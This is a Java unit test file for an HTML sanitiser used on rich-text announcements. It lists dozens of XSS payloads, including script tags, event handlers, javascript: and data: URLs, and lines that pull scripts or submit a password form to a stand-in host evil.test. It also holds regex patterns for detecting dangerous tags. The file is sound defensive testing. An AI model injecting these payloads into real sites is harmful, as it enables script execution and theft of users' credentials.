package com.amanahconnect.announcement;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.List;
import org.junit.jupiter.api.Test;

class RichTextTest {

    /** Classic and mutation XSS vectors. None may survive in any form a browser would run. */
    private static final List<String> PAYLOADS = List.of(
            "<script>alert(1)</script>Hello",
            "<ScRiPt>alert(1)</sCrIpT>Hello",
            "<script src=//evil.test/x.js></script>Hello",
            "<img src=x onerror=alert(1)>Hello",
            "<img src=\"x\" onerror=\"alert(1)\">Hello",
            "<svg onload=alert(1)>Hello</svg>",
            "<svg><script>alert(1)</script></svg>Hello",
            "<iframe src=\"javascript:alert(1)\"></iframe>Hello",
            "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>Hello",
            "<a href=\"javascript:alert(1)\">Hello</a>",
            "<a href=\" javascript:alert(1)\">Hello</a>",
            "<a href=\"JaVaScRiPt:alert(1)\">Hello</a>",
            "<a href=\"&#106;avascript:alert(1)\">Hello</a>",
            "<a href=\"java\tscript:alert(1)\">Hello</a>",
            "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">Hello</a>",
            "<a href=\"vbscript:msgbox(1)\">Hello</a>",
            "<a href=\"https://ok.test\" onclick=\"alert(1)\">Hello</a>",
            "<p onclick=\"alert(1)\" onmouseover=\"alert(2)\">Hello</p>",
            "<body onload=alert(1)>Hello",
            "<input autofocus onfocus=alert(1)>Hello",
            "<form action=\"https://evil.test\"><input name=password></form>Hello",
            "<style>@import 'https://evil.test/x.css';</style>Hello",
            "<p style=\"background:url(javascript:alert(1))\">Hello</p>",
            "<object data=\"https://evil.test/x.swf\"></object>Hello",
            "<embed src=\"https://evil.test/x.swf\">Hello",
            "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.test\">Hello",
            "<link rel=\"stylesheet\" href=\"https://evil.test/x.css\">Hello",
            "<base href=\"https://evil.test/\">Hello",
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">Hello",
            "<<script>alert(1);//<</script>Hello",
            "<scr<script>ipt>alert(1)</scr</script>ipt>Hello",
            "<img src=\"https://tracker.test/pixel.gif\">Hello");

    private static final java.util.regex.Pattern DANGEROUS_TAG = java.util.regex.Pattern.compile("(?i)<\\s*/?\\s*(script|img|iframe|svg|style|form|object|embed|meta|link|base|input|math|body|noscript)");
    private static final java.util.regex.Pattern EVENT_HANDLER = java.util.regex.Pattern.compile("(?i)\\bon[a-z]+\\s*=");

    @Test
    void stripsEveryXssPayload() {
        for (String payload : PAYLOADS) {
            String clean = RichText.sanitize(payload);
            assertThat(clean).as(payload).doesNotContainPattern(DANGEROUS_TAG).doesNotContainPattern(EVENT_HANDLER);
            assertThat(clean.toLowerCase()).as(payload).doesNotContain("javascript:").doesNotContain("vbscript:").doesNotContain("data:text").doesNotContain("style=").doesNotContain("srcdoc");
            assertThat(RichText.text(clean)).as("the harmless text survives: " + payload).contains("Hello");
        }
    }

    @Test
    void mutationXssVectorsAreNeutralised() {
        for (String payload : List.of("<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>Hello", "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">Hello")) {
            String clean = RichText.sanitize(payload);
            assertThat(clean).as(payload).doesNotContainPattern(DANGEROUS_TAG).doesNotContainPattern(EVENT_HANDLER);
            assertThat(RichText.sanitize(clean)).as("stable").isEqualTo(clean);
        }
    }

    @Test
    void theScriptsContentIsDroppedNotShownAsText() {
        assertThat(RichText.sanitize("<script>stealCookies()</script>Hi")).isEqualTo("Hi");
        assertThat(RichText.sanitize("<style>body{display:none}</style>Hi")).isEqualTo("Hi");
    }

    @Test
    void keepsTheFormattingAnnouncementsNeed() {
        String html = "<h2>Water cut</h2><p>On <strong>Monday</strong> and <em>Tuesday</em>:</p><ul><li>block A</li><li>block B</li></ul><blockquote>Please plan ahead</blockquote><p>Line<br />break</p>";

        assertThat(RichText.sanitize(html)).isEqualTo(html);
    }

    @Test
    void linksKeepOnlySafeSchemesAndAlwaysGetRel() {
        assertThat(RichText.sanitize("<a href=\"https://example.test/a?b=1&amp;c=2\">link</a>")).contains("href=\"https://example.test/a?b&#61;1&amp;c&#61;2\"").contains("rel=\"nofollow noopener noreferrer\"");
        assertThat(RichText.sanitize("<a href=\"mailto:office&#64;example.test\">mail</a>")).contains("href=\"mailto:office&#64;example.test\"");
        assertThat(RichText.sanitize("<a href=\"http://example.test\">plain http</a>")).contains("href=\"http://example.test\"");
        assertThat(RichText.sanitize("<a href=\"ftp://example.test\">ftp</a>")).doesNotContain("href");
        assertThat(RichText.sanitize("<a href=\"//example.test\" target=\"_top\">relative</a>")).doesNotContain("target=");
        assertThat(RichText.sanitize("<a href=\"https://example.test\" target=\"_blank\">x</a>")).as("the page cannot be navigated by a link").doesNotContain("_top");
    }

    @Test
    void textExtractionKeepsLineBreaksAndDecodesEntities() {
        assertThat(RichText.text("<p>Rent &amp; dues</p><p>Pay by <strong>5th</strong></p><ul><li>one</li><li>two</li></ul>")).isEqualTo("Rent & dues\nPay by 5th\none\ntwo");
        assertThat(RichText.text("a<br>b")).isEqualTo("a\nb");
        assertThat(RichText.text("<p>1 &lt; 2 &amp;&amp; <b>x</b></p>")).isEqualTo("1 < 2 && x");
        assertThat(RichText.text(null)).isEmpty();
    }

    @Test
    void aBodyThatIsOnlyUnsafeMarkupIsBlank() {
        assertThat(RichText.isBlank(RichText.sanitize("<script>alert(1)</script>"))).isTrue();
        assertThat(RichText.isBlank(RichText.sanitize("<img src=x onerror=alert(1)>"))).isTrue();
        assertThat(RichText.isBlank(RichText.sanitize("<p>&nbsp;</p>"))).isTrue();
        assertThat(RichText.isBlank(RichText.sanitize("<p>Hi</p>"))).isFalse();
    }

    @Test
    void sanitisingTwiceChangesNothing() {
        for (String payload : PAYLOADS) {
            String once = RichText.sanitize(payload);
            assertThat(RichText.sanitize(once)).as(payload).isEqualTo(once);
        }
    }
}
